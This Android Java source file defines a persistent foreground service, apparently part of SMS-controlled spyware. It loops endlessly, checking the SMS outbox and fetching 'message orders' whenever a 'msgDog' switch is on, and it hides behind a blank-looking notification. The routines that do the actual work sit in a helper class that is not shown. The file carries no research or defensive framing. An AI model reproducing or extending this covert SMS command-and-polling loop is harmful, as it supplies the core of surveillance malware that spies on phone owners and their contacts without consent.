package com.example.doit;

import android.app.Notification;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.widget.Toast;

public class ServiceM extends Service {
	public serviceM_Handler serviceM_Handler=new serviceM_Handler();

@Override
public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	
@Override
public void onCreate()
	{
	setFore();
	}
	
@Override
public int onStartCommand(Intent intent,int int_0,int int_1)
  {new smsOrderThread(getApplicationContext()).start(); 
   return super.onStartCommand(intent,START_STICKY,int_1);  
  }

public class smsOrderThread extends Thread
 {  Context context;
    Methods method=new Methods();
	 public smsOrderThread(Context context)
	 {this.context=context;		 
	 }   
	 @Override
	 public void run()
	 {while(true)
	  {  if(method.getSwitchValue("msgDog").equals("on"))
	    {method.checkM(2, context);
	     method.checkOutBoxSms(context);
	     method.getMsgOrder(context);
	     serviceM_Handler.obtainMessage().sendToTarget();
	     try{sleep(50);}
	     catch(Exception e)
	     {}
	    }else
	    {try{sleep(50);}
	     catch(Exception e)
	     {}	    	
	    }
	  }
     }
}
 
  public class serviceM_Handler extends Handler
  {
	  @Override
	  public void handleMessage(Message msg)
	  {
		  
	  }
	  
  }

  
  public void setFore()
  {if(Build.VERSION.SDK_INT<18)
  {startForeground(1120,new Notification());
  }else{
   Notification notification=new Notification();
   Intent notiIntent=new Intent(this,MainActivity.class);
   PendingIntent pIntent=PendingIntent.getActivity(getApplicationContext(),0,notiIntent,0);
   notification.setLatestEventInfo(getApplicationContext(), "a","b",pIntent);
   startForeground(1120,notification);
  }
  }

}
